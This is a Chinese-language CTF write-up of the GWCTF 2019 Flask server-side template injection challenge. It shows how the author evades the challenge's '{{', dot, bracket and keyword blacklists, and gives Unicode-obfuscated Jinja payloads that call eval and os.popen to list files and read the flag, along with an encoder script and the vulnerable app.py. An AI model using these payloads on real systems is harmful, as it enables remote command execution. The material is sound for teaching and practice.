# \[GWCTF 2019]你的名字

## \[GWCTF 2019]你的名字

## 考点

* Flask SSTI
* Flask SSTI绕过
* 绕过`{{}}`
* 绕过`.`
* 绕过黑名单
* `__getitem__()`绕过`[]`的过滤

## wp

输入字符串会回显，大概率SSTI

![](<../../.gitbook/assets/image (21).png>)

输入`{{7*7}}`给了错误提示

```
Parse error: syntax error, unexpected T_STRING, expecting '{' in \var\WWW\html\test.php on line 13
```

输入`a{*a*}b`原样输出，可能是过滤了`{{`或者`}}`

尝试`{%print(1)%}`得到结果1，既然可能有很多过滤，直接上珍藏多年的payload

```
{% raw %}
{%print(lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u0065\u0076\u0061\u006c')('\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0022\u006f\u0073\u0022\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0022\u006c\u0073\u0022\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029'))%}
{% endraw %}
```

相当于

```
{% raw %}
{%print(lipsum|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("ls").read()'))%}
{% endraw %}
```

`{%print()%}`绕过`{{}}`的过滤

`|attr()`绕过`.`的过滤

`__getitem__()`绕过`[]`的过滤

`\u编码`绕过对字符串的过滤

下面的脚本把字符串转为Unicode编码

```python
import binascii
def getUnicode(s):
    s = list(s)
    res = []
    for i in s:
        res.append(binascii.hexlify(i.encode()).decode())
    res = '\\u00'.join(res)
    return '\\u00'+res
```

获取flag

`ls /`

```
{% raw %}
{%print(lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u0065\u0076\u0061\u006c')('\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0022\u006f\u0073\u0022\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0022\u006c\u0073\u0020\u002f\u0022\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029'))%}
{% endraw %}
```

```
app bin boot dev etc flag_1s_Hera home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

`cat /flag_1s_Hera`

```
{% raw %}
{%print(lipsum|attr('\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f')|attr('\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f')('\u0065\u0076\u0061\u006c')('\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0022\u006f\u0073\u0022\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0022\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u005f\u0031\u0073\u005f\u0048\u0065\u0072\u0061\u0022\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029'))%}
{% endraw %}
```

![](<../../.gitbook/assets/image (34) (1).png>)

app.py

```python
hello #!/usr/bin/env python
# -*- coding: utf-8 -*-
from flask import Flask, render_template, render_template_string, request

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
@app.route('/index.php', methods=['GET', 'POST'])
def index():
    def safe_filter(s):
        blacklist1 = ['{import','{getattr','{os','{class','{subclasses','{mro','{request','{args','{eval','{if','{for','{subprocess','{file','{open','{popen','{builtins','{compile','{execfile','{from_pyfile','{local','{self','{item','{getitem','{getattribute','{func_globals','{config']
        blacklist_strong = blacklist1 + ['{{', '}}']
        for no in blacklist_strong:
            if no in s:
                return '1'
            else:
                continue

        blacklist = ['import','getattr','os','class','subclasses','mro','request','args','eval','if','for',' subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','local','self','item','getitem','getattribute','func_globals','config']
        for no in blacklist:
            while True:
                if no in s:
                    s =s.replace(no,'')
                else:
                    break
        return s
    if request.method == 'POST':
        name = request.form['name']
        template = 'hello {}!'.format(name)
        name1 = render_template_string(safe_filter(template))
        print name1
        if name1 == '1':
            template1 = u'''
            <strong>Parse error:</strong> syntax error, unexpected T_STRING, expecting '{' in <strong>\\var\\WWW\\html\\test.php</strong> on line <strong>13</strong>
                '''
            return render_template_string(template1)
        else:
            return render_template('index.html', name=name1)

    if request.method == 'GET':
        return render_template('index.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=False)
!
```
